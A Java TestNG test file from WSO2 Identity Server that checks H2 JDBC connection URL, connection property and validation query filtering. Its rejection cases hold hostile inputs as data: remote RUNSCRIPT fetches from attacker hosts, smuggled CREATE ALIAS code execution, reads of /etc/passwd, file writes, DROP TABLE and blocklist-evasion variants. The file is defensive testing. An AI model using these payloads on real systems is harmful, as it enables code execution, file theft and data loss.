/*
 * Copyright (c) 2026, WSO2 LLC. (http://www.wso2.com).
 *
 * WSO2 LLC. licenses this file to you under the Apache License,
 * Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied. See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */

package org.wso2.carbon.identity.user.store.configuration.utils;

import org.mockito.MockedStatic;
import org.testng.annotations.DataProvider;
import org.testng.annotations.Test;
import org.wso2.carbon.identity.core.util.IdentityUtil;

import java.util.Arrays;
import java.util.List;

import static org.mockito.Mockito.mockStatic;
import static org.testng.Assert.fail;
import static org.wso2.carbon.identity.user.store.configuration.utils.UserStoreConfigurationConstant
        .ALLOWED_CONNECTION_URL_PROPERTY_CONFIG;

/**
 * Tests the H2 connection URL allow list enforced by
 * {@link SecondaryUserStoreConfigurationUtil#validateJdbcConnectionUrl(String)}.
 */
public class SecondaryUserStoreConfigurationUtilTest {

    /**
     * A backslash followed by a semicolon, assembled instead of written as one literal because the Checkstyle
     * parser used by the build cannot lex that escape sequence inline.
     */
    private static final String ESCAPED_SEMICOLON = "\\" + ";";

    /**
     * A sample deployment allow list, used to stub the configuration lookup. It is deliberately not the set
     * product-is ships in default.json. The validator enforces whatever a deployment has configured, so these
     * tests cover that reading, not the shipped defaults, and a name here carries no claim that default.json
     * ships it. Do not sync this list to default.json.
     */
    private static final List<String> CONFIGURED_PROPERTIES = Arrays.asList(
            "MODE", "DB_CLOSE_DELAY", "DB_CLOSE_ON_EXIT", "LOCK_TIMEOUT", "CACHE_SIZE", "IGNORECASE",
            "QUERY_TIMEOUT", "MAX_MEMORY_ROWS", "THROTTLE", "TRACE_LEVEL_FILE", "TRACE_LEVEL_SYSTEM_OUT",
            "SCHEMA_SEARCH_PATH");

    private void validateWithConfiguredAllowList(String connectionUrl) throws IdentityUserStoreMgtException {

        try (MockedStatic<IdentityUtil> identityUtil = mockStatic(IdentityUtil.class)) {
            identityUtil.when(() -> IdentityUtil.getPropertyAsList(ALLOWED_CONNECTION_URL_PROPERTY_CONFIG))
                    .thenReturn(CONFIGURED_PROPERTIES);
            SecondaryUserStoreConfigurationUtil.validateJdbcConnectionUrl(connectionUrl);
        }
    }

    @DataProvider(name = "allowedConnectionUrls")
    public Object[][] allowedConnectionUrls() {

        return new Object[][]{
                {null},
                {""},
                {"jdbc:h2:mem:test"},
                {"jdbc:h2:tcp://localhost:9092/um"},
                {"jdbc:h2:ssl://localhost:9092/um"},
                {"jdbc:h2:mem:test;DB_CLOSE_DELAY=-1"},
                {"jdbc:h2:mem:test;DB_CLOSE_DELAY=-1;MODE=MySQL"},
                {"jdbc:h2:mem:test;LOCK_TIMEOUT=10000"},
                {"jdbc:h2:mem:test;db_close_delay=-1"},
                {"jdbc:h2:mem:test;SCHEMA_SEARCH_PATH=PUBLIC,OTHER"},
                {"jdbc:h2:mem:test;DB_CLOSE_ON_EXIT=FALSE"},
                {"jdbc:h2:mem:test;TRACE_LEVEL_FILE=4"},
                // Validation is scoped to H2, so URLs for every other driver pass through untouched. These are the
                // URLs WSO2 documents for its own supported databases.
                {"jdbc:mysql://localhost:3306/wso2_um?useSSL=false"},
                {"jdbc:sqlserver://localhost:1433;databaseName=userdb;SendStringParametersAsUnicode=false"},
                {"jdbc:sqlserver://DB_HOST:1433;databaseName=WSO2_IDENTITY_DB;loginTimeout=10;socketTimeout=60000"},
                {"jdbc:db2://DB_HOST:50000/WSO2_IDENTITY_DB:loginTimeout=10;queryTimeout=60;"},
                {"jdbc:oracle:thin:@//localhost:1521/ORCLPDB1"},
                {"jdbc:postgresql://localhost:5432/wso2_um?ssl=false"},
                // A file backed database is the documented form for a secondary JDBC user store and is what the
                // product's own integration tests create. H2 appends its own .mv.db suffix to the path, so a file
                // URL cannot place a file of a chosen type. Their properties are still validated, below.
                {"jdbc:h2:./repository/database/JDBC_USER_STORE_DB"},
                {"jdbc:h2:/opt/wso2is/repository/database/WSO2CARBON_DB"},
                {"jdbc:h2:file:/var/lib/wso2/userstore"},
                {"jdbc:h2:./repository/database/WSO2CARBON_DB;DB_CLOSE_ON_EXIT=FALSE;LOCK_TIMEOUT=60000"},
                // Mixed case prefixes are file paths to H2 rather than in memory or server connections. They are
                // accepted for the same reason, and are held to the same property rules.
                {"jdbc:h2:MEM:planted"},
                {"jdbc:h2:TCP://localhost:9092/planted"}
        };
    }

    @Test(dataProvider = "allowedConnectionUrls")
    public void testAllowedConnectionUrls(String connectionUrl) {

        try {
            validateWithConfiguredAllowList(connectionUrl);
        } catch (IdentityUserStoreMgtException e) {
            fail("A legitimate connection URL was rejected: " + connectionUrl, e);
        }
    }

    @DataProvider(name = "rejectedConnectionUrls")
    public Object[][] rejectedConnectionUrls() {

        String smuggled = ESCAPED_SEMICOLON + "CREATE ALIAS RCE AS SOURCE" + ESCAPED_SEMICOLON + "CALL RCE()";
        return new Object[][]{
                {"jdbc:h2:mem:poc;INIT=RUNSCRIPT FROM http://attacker/x.sql"},
                {"jdbc:h2:mem:poc;init=CREATE ALIAS X"},
                {"jdbc:h2:mem:poc;LOCK_TIMEOUT=0" + smuggled},
                {"jdbc:h2:mem:poc;QUERY_TIMEOUT=0" + smuggled},
                {"jdbc:h2:mem:poc;CACHE_SIZE=0" + smuggled},
                {"jdbc:h2:mem:poc;THROTTLE=0" + smuggled},
                {"jdbc:h2:mem:poc;IGNORECASE=TRUE" + smuggled},
                {"jdbc:h2:mem:poc;DATABASE_EVENT_LISTENER=org.example.Listener"},
                {"jdbc:h2:mem:poc;JAVA_OBJECT_SERIALIZER=org.example.Serializer"},
                {"jdbc:h2:mem:poc;BUILTIN_ALIAS_OVERRIDE=1"},
                {"jdbc:h2:mem:poc;AUTHENTICATOR=org.example.Auth"},
                // H2 evaluates a property value as a SQL expression, so an allow listed property name is still a
                // sink unless the value itself is constrained. No semicolon is involved in any of these.
                {"jdbc:h2:mem:poc;LOCK_TIMEOUT=CSVWRITE('/tmp/x.csv','SELECT 1')"},
                // The same rules apply once the locator is a file path rather than an in memory name.
                {"jdbc:h2:./repository/database/UM_DB;INIT=RUNSCRIPT FROM 'http://evil/x.sql'"},
                {"jdbc:h2:./repository/database/UM_DB;LOCK_TIMEOUT=CSVWRITE('/tmp/x.csv','SELECT 1')"},
                {"jdbc:h2:MEM:planted;DEFAULT_TABLE_ENGINE=org.example.Evil"},
                {"jdbc:h2:mem:poc;QUERY_TIMEOUT=CSVWRITE('/tmp/x.csv','SELECT FILE_READ(''/etc/passwd'')')"},
                {"jdbc:h2:mem:poc;CACHE_SIZE=FILE_READ('/etc/passwd')"},
                {"jdbc:h2:mem:poc;THROTTLE=(SELECT 1)"},
                {"jdbc:h2:mem:poc;TRACE_LEVEL_FILE=CSVREAD('/etc/passwd')"},
                {"jdbc:h2:mem:poc;MAX_MEMORY_ROWS=1 OR 1=1"}
        };
    }

    @Test(dataProvider = "rejectedConnectionUrls", expectedExceptions = IdentityUserStoreMgtException.class)
    public void testRejectedConnectionUrls(String connectionUrl) throws IdentityUserStoreMgtException {

        validateWithConfiguredAllowList(connectionUrl);
    }

    /**
     * If the shipped configuration is missing the property names cannot be checked, but smuggling a statement
     * through an escaped semicolon must still be refused.
     */
    @Test(expectedExceptions = IdentityUserStoreMgtException.class)
    public void testEscapedSemicolonRejectedWithoutConfiguredAllowList() throws IdentityUserStoreMgtException {

        try (MockedStatic<IdentityUtil> identityUtil = mockStatic(IdentityUtil.class)) {
            identityUtil.when(() -> IdentityUtil.getPropertyAsList(ALLOWED_CONNECTION_URL_PROPERTY_CONFIG))
                    .thenReturn(java.util.Collections.emptyList());
            SecondaryUserStoreConfigurationUtil.validateJdbcConnectionUrl(
                    "jdbc:h2:mem:poc;LOCK_TIMEOUT=0" + ESCAPED_SEMICOLON + "CALL X()");
        }
    }

    /**
     * The old name is retained for existing callers and must keep enforcing the same rules.
     */
    @Test(expectedExceptions = IdentityUserStoreMgtException.class)
    public void testDeprecatedEntryPointStillValidates() throws IdentityUserStoreMgtException {

        try (MockedStatic<IdentityUtil> identityUtil = mockStatic(IdentityUtil.class)) {
            identityUtil.when(() -> IdentityUtil.getPropertyAsList(ALLOWED_CONNECTION_URL_PROPERTY_CONFIG))
                    .thenReturn(CONFIGURED_PROPERTIES);
            SecondaryUserStoreConfigurationUtil.validateConnectionUrlForInitExpressions(
                    "jdbc:h2:mem:poc;INIT=RUNSCRIPT FROM http://attacker/x.sql");
        }
    }

    /**
     * A denied property stays denied even if a deployment adds it to the configured allow list.
     */
    @Test(expectedExceptions = IdentityUserStoreMgtException.class)
    public void testDeniedPropertyCannotBeAllowedByConfiguration() throws IdentityUserStoreMgtException {

        try (MockedStatic<IdentityUtil> identityUtil = mockStatic(IdentityUtil.class)) {
            identityUtil.when(() -> IdentityUtil.getPropertyAsList(ALLOWED_CONNECTION_URL_PROPERTY_CONFIG))
                    .thenReturn(java.util.Arrays.asList("MODE", "DEFAULT_TABLE_ENGINE", "INIT"));
            SecondaryUserStoreConfigurationUtil.validateJdbcConnectionUrl(
                    "jdbc:h2:mem:poc;DEFAULT_TABLE_ENGINE=org.example.Engine");
        }
    }

    /**
     * Every denied property, in three casings, with that same property also placed on the configured allow
     * list. Putting it on the allow list is what makes this a test of the deny list alone: without it a
     * rejection could equally come from the allow list rule, which would hide a broken deny list.
     *
     * The deny list is declared lower case and property names are lower cased before lookup, so an entry
     * added to the constant in upper case would silently stop being enforced. These cases fail if that
     * happens.
     */
    @DataProvider(name = "deniedPropertiesInMixedCase")
    public Object[][] deniedPropertiesInMixedCase() {

        Object[][] cases = new Object[UserStoreConfigurationConstant.DENIED_CONNECTION_URL_PROPERTIES.length * 3][2];
        int index = 0;
        for (String denied : UserStoreConfigurationConstant.DENIED_CONNECTION_URL_PROPERTIES) {
            for (String cased : new String[]{denied.toLowerCase(java.util.Locale.ENGLISH),
                    denied.toUpperCase(java.util.Locale.ENGLISH),
                    Character.toUpperCase(denied.charAt(0)) + denied.substring(1)}) {
                cases[index++] = new Object[]{"jdbc:h2:mem:poc;" + cased + "=1", cased};
            }
        }
        return cases;
    }

    @Test(dataProvider = "deniedPropertiesInMixedCase", expectedExceptions = IdentityUserStoreMgtException.class)
    public void testDeniedPropertiesRejectedRegardlessOfCase(String connectionUrl, String allowedProperty)
            throws IdentityUserStoreMgtException {

        try (MockedStatic<IdentityUtil> identityUtil = mockStatic(IdentityUtil.class)) {
            identityUtil.when(() -> IdentityUtil.getPropertyAsList(ALLOWED_CONNECTION_URL_PROPERTY_CONFIG))
                    .thenReturn(java.util.Arrays.asList(allowedProperty));
            SecondaryUserStoreConfigurationUtil.validateJdbcConnectionUrl(connectionUrl);
        }
    }

    @DataProvider(name = "rejectedConnectionProperties")
    public Object[][] rejectedConnectionProperties() {

        return new Object[][]{
                // INIT runs SQL at connect time, and reaches the driver through this property as readily as
                // through the URL.
                {"INIT=RUNSCRIPT FROM 'http://attacker/x.sql'", "jdbc:h2:mem:poc"},
                {"INIT=CALL CSVWRITE('/tmp/x.csv','SELECT 1')", "jdbc:h2:mem:poc"},
                {"init=CALL X()", "jdbc:h2:mem:poc"},
                // An allow listed name is still a sink unless the value is constrained. No semicolon needed.
                {"LOCK_TIMEOUT=CSVWRITE('/tmp/x.csv','SELECT 1')", "jdbc:h2:mem:poc"},
                {"QUERY_TIMEOUT=FILE_READ('/etc/passwd')", "jdbc:h2:mem:poc"},
                // Other denied names reach the driver the same way.
                {"DATABASE_EVENT_LISTENER=org.example.Listener", "jdbc:h2:mem:poc"},
                {"DEFAULT_TABLE_ENGINE=org.example.Engine", "jdbc:h2:mem:poc"},
                // A property that is not on the allow list at all.
                {"LAZY_QUERY_EXECUTION=1", "jdbc:h2:mem:poc"},
                // Several properties, only the last one hostile.
                {"MODE=MySQL;INIT=CALL X()", "jdbc:h2:mem:poc"}
        };
    }

    @Test(dataProvider = "rejectedConnectionProperties", expectedExceptions = IdentityUserStoreMgtException.class)
    public void testRejectedConnectionProperties(String connectionProperties, String connectionUrl)
            throws IdentityUserStoreMgtException {

        try (MockedStatic<IdentityUtil> identityUtil = mockStatic(IdentityUtil.class)) {
            identityUtil.when(() -> IdentityUtil.getPropertyAsList(ALLOWED_CONNECTION_URL_PROPERTY_CONFIG))
                    .thenReturn(CONFIGURED_PROPERTIES);
            SecondaryUserStoreConfigurationUtil.validateConnectionProperties(connectionProperties, connectionUrl);
        }
    }

    @DataProvider(name = "allowedConnectionProperties")
    public Object[][] allowedConnectionProperties() {

        return new Object[][]{
                {null, "jdbc:h2:mem:poc"},
                {"", "jdbc:h2:mem:poc"},
                {"MODE=MySQL", "jdbc:h2:mem:poc"},
                {"LOCK_TIMEOUT=60000;QUERY_TIMEOUT=5000", "jdbc:h2:mem:poc"},
                // Scoped to H2: other drivers keep using connectionProperties as they always have.
                {"useSSL=true;serverTimezone=UTC", "jdbc:mysql://db:3306/wso2"},
                {"oracle.net.tns_admin=/opt/oracle/network/admin", "jdbc:oracle:thin:@db:1521/orcl"},
                {"INIT=CALL X()", "jdbc:postgresql://db:5432/wso2"},
                // No URL to scope against, so nothing to enforce.
                {"INIT=CALL X()", null}
        };
    }

    @Test(dataProvider = "allowedConnectionProperties")
    public void testAllowedConnectionProperties(String connectionProperties, String connectionUrl)
            throws IdentityUserStoreMgtException {

        try (MockedStatic<IdentityUtil> identityUtil = mockStatic(IdentityUtil.class)) {
            identityUtil.when(() -> IdentityUtil.getPropertyAsList(ALLOWED_CONNECTION_URL_PROPERTY_CONFIG))
                    .thenReturn(CONFIGURED_PROPERTIES);
            SecondaryUserStoreConfigurationUtil.validateConnectionProperties(connectionProperties, connectionUrl);
        }
    }

    @DataProvider(name = "allowedValidationQueries")
    public Object[][] allowedValidationQueries() {

        return new Object[][]{
                {"SELECT 1"},
                {"SELECT 1 FROM DUAL"},
                {"SELECT SYSDATE FROM DUAL"},
                {"SELECT 1 FROM SYSIBM.SYSDUMMY1"},
                {"SELECT * FROM SYSIBM.SYSDUMMY1"},
                {"VALUES 1"},
                {"SELECT 1 FROM RDB$DATABASE"},
                {"SELECT CURRENT_TIMESTAMP"},
                // Case, padding and a single trailing semicolon are tolerated.
                {"  select   1  "},
                {"SELECT 1;"},
                // An unset query leaves the pool on its default behaviour.
                {""},
                {null}
        };
    }

    @Test(dataProvider = "allowedValidationQueries")
    public void testAllowedValidationQueries(String validationQuery) {

        try {
            SecondaryUserStoreConfigurationUtil.validateValidationQuery(validationQuery);
        } catch (IdentityUserStoreMgtException e) {
            fail("A legitimate validation query was rejected: " + validationQuery, e);
        }
    }

    @DataProvider(name = "rejectedValidationQueries")
    public Object[][] rejectedValidationQueries() {

        return new Object[][]{
                // The pool runs this through Statement.execute, so H2 compiles and calls Java.
                {"CREATE ALIAS X AS $$ String x(String c) throws Exception { return c; } $$; CALL X('id')"},
                // A benign prefix constrains nothing that follows it.
                {"SELECT 1; CREATE ALIAS X AS $$ String x() { return \"y\"; } $$; CALL X()"},
                // H2 reaches the file system and the network from inside a plain SELECT.
                {"SELECT FILE_WRITE('x', '/tmp/owned')"},
                {"SELECT * FROM CSVREAD('http://127.0.0.1/x')"},
                {"SELECT FILE_READ('/etc/passwd')"},
                // Forms that defeat a keyword blocklist: case, comment, quoted identifier, newline.
                {"select file_write('x', '/tmp/owned')"},
                {"SELECT/**/FILE_WRITE('x', '/tmp/owned')"},
                {"SELECT \"FILE_WRITE\"('x', '/tmp/owned')"},
                {"SELECT\nFILE_WRITE('x', '/tmp/owned')"},
                // Statements that need neither parentheses nor quotes, so the character rule alone misses them.
                {"DROP TABLE UM_USER"},
                {"DELETE FROM UM_USER"},
                {"SHUTDOWN"},
                {"RUNSCRIPT FROM 'http://127.0.0.1/x.sql'"},
                // A semicolon anywhere other than the very end.
                {"SELECT 1; SELECT 2"}
        };
    }

    @Test(dataProvider = "rejectedValidationQueries", expectedExceptions = IdentityUserStoreClientException.class)
    public void testRejectedValidationQueries(String validationQuery) throws IdentityUserStoreMgtException {

        SecondaryUserStoreConfigurationUtil.validateValidationQuery(validationQuery);
    }
}
